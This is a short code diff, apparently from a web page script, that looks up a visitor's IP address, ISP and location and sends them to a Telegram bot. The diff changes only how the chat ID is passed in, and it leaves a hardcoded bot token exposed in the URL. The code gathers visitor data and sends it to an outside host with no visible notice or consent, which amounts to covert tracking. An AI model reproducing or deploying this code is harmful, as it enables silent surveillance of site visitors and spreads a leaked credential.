@@ -43,18 +43,19 @@
                 debugLog(`ISP: ${isp}`);
                 debugLog(`Location: ${location}`);
 
-                sendToTelegram(ip, isp, location);
+                // Ganti chat_id dengan Chat ID numerik yang benar
+                sendToTelegram(ip, isp, location, 'YOUR_CHAT_ID');
             } catch (error) {
                 debugLog("Error fetching IP information: " + error.message);
             }
         }
 
-        async function sendToTelegram(ip, isp, location) {
+        async function sendToTelegram(ip, isp, location, chatId) {
             const message = `IP: ${ip} ISP: ${isp} Location: ${location}`;
             const telegramUrl = `https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage`;
 
             const payload = {
-                chat_id: "@HansSlebewG",
+                chat_id: chatId,
                 text: message
             };
 
